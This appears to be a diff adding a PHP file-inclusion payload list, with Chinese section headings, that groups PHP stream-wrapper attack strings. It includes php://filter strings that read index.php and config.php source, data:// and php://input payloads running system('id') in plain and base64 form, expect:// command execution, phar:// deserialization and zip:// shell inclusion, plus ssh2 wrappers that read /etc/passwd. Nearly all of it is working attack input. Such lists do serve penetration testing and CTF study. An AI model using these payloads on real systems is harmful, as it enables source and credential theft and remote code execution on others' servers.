@@ -1,0 +1,46 @@
+# PHP Filter - 读取源码
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=config.php
+php://filter/convert.base64-encode/resource=../config.php
+php://filter/read=string.rot13/resource=index.php
+php://filter/read=string.toupper/resource=index.php
+php://filter/read=string.tolower/resource=index.php
+php://filter/zlib.deflate/convert.base64-encode/resource=index.php
+php://filter/convert.iconv.utf-8.utf-16/resource=index.php
+php://filter/convert.iconv.utf-8.utf-16le/resource=index.php
+
+# PHP Input - RCE
+php://input
+# POST: <?php system('id'); ?>
+
+# PHP Data - RCE
+data://text/plain,<?php system('id'); ?>
+data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
+data:text/plain,<?php system('id'); ?>
+data:text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
+
+# Expect - RCE
+expect://id
+expect://whoami
+expect://ls
+
+# Phar - 反序列化
+phar://test.phar/test.txt
+phar://test.jpg/test.txt
+
+# Zip - 读取压缩包内文件
+zip://test.zip#shell.php
+zip://test.jpg#shell.php
+
+# Glob - 目录遍历
+glob:///*
+glob:///var/www/*
+
+# SSH2 (需要扩展)
+ssh2.shell://user:pass@host:22/xterm
+ssh2.exec://user:pass@host:22/id
+ssh2.tunnel://user:pass@host:22/127.0.0.1:3306
+ssh2.sftp://user:pass@host:22/etc/passwd
+
+# FTP
+ftp://user:pass@host/file.txt
